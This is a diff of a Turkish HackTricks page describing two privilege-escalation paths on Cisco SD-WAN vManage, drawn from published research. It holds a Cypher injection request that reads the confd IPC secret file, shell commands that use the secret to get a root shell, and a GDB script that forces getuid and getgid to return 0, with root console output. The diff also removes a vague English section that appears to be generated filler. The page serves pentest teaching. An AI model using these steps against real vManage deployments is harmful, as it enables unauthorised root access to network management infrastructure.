@@ -1,28 +1,31 @@
 # Cisco - vmanage
 
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin.
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin.
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
-* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**'a PR göndererek paylaşın.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
 
-## Yol 1
+## Path 1
 
-(Örnek [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html) adresinden alınmıştır)
+(Örnek [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html) adresinden)
 
-Biraz [belgelere](http://66.218.245.39/doc/html/rn03re18.html) göz attıktan sonra, `confd` ve farklı ikili dosyalarla ilgili (Cisco web sitesindeki bir hesapla erişilebilir) bazı belgelere göre, IPC soketini kimlik doğrulamak için `/etc/confd/confd_ipc_secret` konumunda bir gizli kullanıldığını bulduk:
+`confd` ve Cisco web sitesinde bir hesapla erişilebilen farklı ikili dosyalarla ilgili bazı [belgelere](http://66.218.245.39/doc/html/rn03re18.html) biraz araştırma yaptıktan sonra, IPC soketini kimlik doğrulamak için `/etc/confd/confd_ipc_secret` konumunda bulunan bir gizli anahtar kullandığını bulduk:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-Hatırlayın, Neo4j örneğimiz var mı? Bu, `vmanage` kullanıcısının ayrıcalıkları altında çalışıyor, bu da bize önceki zafiyeti kullanarak dosyayı almayı sağlıyor:
+Hatırlıyor musunuz Neo4j örneğimizi? `vmanage` kullanıcısının ayrıcalıkları altında çalışıyor, bu da bize önceki zafiyeti kullanarak dosyayı almamıza olanak tanıyor:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -34,7 +37,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-`confd_cli` programı komut satırı argümanlarını desteklemez, ancak `/usr/bin/confd_cli_user`'ı argümanlarla çağırır. Bu nedenle, kendi argüman setimizle `/usr/bin/confd_cli_user`'ı doğrudan çağırabiliriz. Ancak mevcut yetkilerimizle okunabilir değil, bu yüzden rootfs'ten alıp scp kullanarak kopyalamamız, yardımı okumamız ve kabuğu elde etmek için kullanmamız gerekiyor:
+`confd_cli` programı komut satırı argümanlarını desteklemiyor, ancak `/usr/bin/confd_cli_user`'ı argümanlarla çağırıyor. Bu nedenle, kendi argüman setimizle doğrudan `/usr/bin/confd_cli_user`'ı çağırabiliriz. Ancak mevcut ayrıcalıklarımızla okunabilir değil, bu yüzden onu rootfs'ten alıp scp kullanarak kopyalamamız, yardımı okumamız ve shell almak için kullanmamız gerekiyor:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -52,13 +55,13 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Yol 2
+## Path 2
 
-(Örnek: [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+(Örnek [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77) adresinden)
 
-Synacktiv ekibinin blog¹'ünde, bir root kabuğu elde etmek için zarif bir yol tarif edilmiştir, ancak dezavantajı yalnızca root tarafından okunabilen `/usr/bin/confd_cli_user` kopyasını elde etmeyi gerektirmesidir. Ben, bu tür zorluklar olmadan root ayrıcalığına yükseltmek için başka bir yol buldum.
+Synacktiv ekibinin blogu¹, bir root shell elde etmenin şık bir yolunu tanımladı, ancak dezavantajı, yalnızca root tarafından okunabilen `/usr/bin/confd_cli_user` dosyasının bir kopyasını almayı gerektirmesidir. Böyle bir zahmete girmeden root'a yükselmenin başka bir yolunu buldum.
 
-`/usr/bin/confd_cli` ikili dosyasını parçaladığımda aşağıdakileri gözlemledim:
+`/usr/bin/confd_cli` ikili dosyasını çözdüğümde, aşağıdakileri gözlemledim:
 ```
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -87,20 +90,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
 … snipped …
 ```
-"ps aux" komutunu çalıştırdığımda aşağıdakileri gözlemledim (_not -g 100 -u 107_)
+When I run “ps aux”, I observed the following (_not -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Ben, "confd\_cli" programının, giriş yapmış kullanıcıdan topladığı kullanıcı kimliği ve grup kimliğini "cmdptywrapper" uygulamasına ilettiğini varsaydım.
+Ben “confd\_cli” programının, oturum açmış kullanıcıdan topladığı kullanıcı kimliğini ve grup kimliğini “cmdptywrapper” uygulamasına ilettiğini varsaydım.
 
-İlk denemem, "cmdptywrapper"ı doğrudan çalıştırmak ve ona `-g 0 -u 0` sağlamaktı, ancak başarısız oldu. Görünüşe göre bir dosya tanımlayıcısı (-i 1015) yolda bir yerde oluşturuldu ve onu sahteleyemiyorum.
+İlk denemem “cmdptywrapper”'ı doğrudan çalıştırmak ve ona `-g 0 -u 0` sağlamak oldu, ancak başarısız oldu. Görünüşe göre bir dosya tanımlayıcısı (-i 1015) bir yerde oluşturulmuş ve bunu taklit edemiyorum.
 
-Synacktiv'in blogunda belirtildiği gibi (son örnek), `confd_cli` programı komut satırı argümanını desteklemiyor, ancak onu bir hata ayıklayıcıyla etkileyebilirim ve neyse ki sistemde GDB bulunuyor.
+Synacktiv’in blogunda belirtildiği gibi (son örnek), `confd_cli` programı komut satırı argümanlarını desteklemiyor, ancak bir hata ayıklayıcı ile bunu etkileyebilirim ve şans eseri GDB sistemde mevcut.
 
-API'yi zorlamak için bir GDB betiği oluşturdum ve `getuid` ve `getgid` işlevlerinin 0 değerini döndürmesini sağladım. Zaten deserializasyon RCE aracılığıyla "vmanage" ayrıcalığına sahip olduğum için, `/etc/confd/confd_ipc_secret` dosyasını doğrudan okuma iznim var.
+API `getuid` ve `getgid`'in 0 döndürmesini zorladığım bir GDB betiği oluşturdum. Zaten deserialization RCE aracılığıyla “vmanage” ayrıcalığına sahip olduğum için, `/etc/confd/confd_ipc_secret` dosyasını doğrudan okuma iznim var.
 
 root.gdb:
 ```
@@ -120,43 +123,7 @@ root
 end
 run
 ```
-# Cisco vManage
-
-## Introduction
-
-Cisco vManage is a cloud-based network management platform that provides centralized control and monitoring of Cisco SD-WAN devices. It allows network administrators to configure, monitor, and troubleshoot their SD-WAN infrastructure.
-
-## Privilege Escalation
-
-### Default Credentials
-
-Cisco vManage uses default credentials for initial access. The default username is `admin` and the default password is `admin`. It is important to change these default credentials to prevent unauthorized access.
-
-### Command Injection
-
-Cisco vManage is vulnerable to command injection attacks. An attacker can exploit this vulnerability by injecting malicious commands into user input fields. This can lead to remote code execution and privilege escalation.
-
-To exploit this vulnerability, an attacker needs to identify the vulnerable input fields and inject the malicious commands. This can be done by analyzing the application's source code or by using automated tools like Burp Suite.
-
-Once the attacker successfully injects the malicious commands, they can execute arbitrary commands on the underlying operating system with the privileges of the application.
-
-### File Upload
-
-Cisco vManage allows users to upload files for various purposes. However, it does not properly validate the uploaded files, which can lead to privilege escalation.
-
-An attacker can exploit this vulnerability by uploading a malicious file that contains a payload. Once the file is uploaded, the attacker can trigger the payload to execute arbitrary commands on the underlying operating system with the privileges of the application.
-
-To exploit this vulnerability, an attacker needs to identify the file upload functionality and upload a malicious file. This can be done by analyzing the application's source code or by using automated tools like Burp Suite.
-
-### Remote Code Execution
-
-Cisco vManage is vulnerable to remote code execution attacks. An attacker can exploit this vulnerability by injecting malicious code into user input fields or by uploading a malicious file.
-
-To exploit this vulnerability, an attacker needs to identify the vulnerable input fields or the file upload functionality. Once the attacker successfully injects the malicious code or uploads the malicious file, they can execute arbitrary commands on the underlying operating system with the privileges of the application.
-
-## Conclusion
-
-Privilege escalation in Cisco vManage can be achieved through default credentials, command injection, file upload, and remote code execution vulnerabilities. It is important to secure Cisco vManage by changing the default credentials, implementing input validation, and properly validating uploaded files. Regular security assessments and patching are also recommended to mitigate these vulnerabilities.
+Konsol Çıktısı:
 ```
 vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
 GNU gdb (GDB) 8.0.1
@@ -190,14 +157,17 @@ root
 uid=0(root) gid=0(root) groups=0(root)
 bash-4.4#
 ```
+{% hint style="success" %}
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary>HackTricks'i Destekleyin</summary>
 
-* Bir **cybersecurity şirketinde mi çalışıyorsunuz**? **Şirketinizi HackTricks'te reklamını görmek** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
-* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT koleksiyonumuzu**](https://opensea.io/collection/the-peass-family)
-* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da beni takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.
+* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
+{% endhint %}
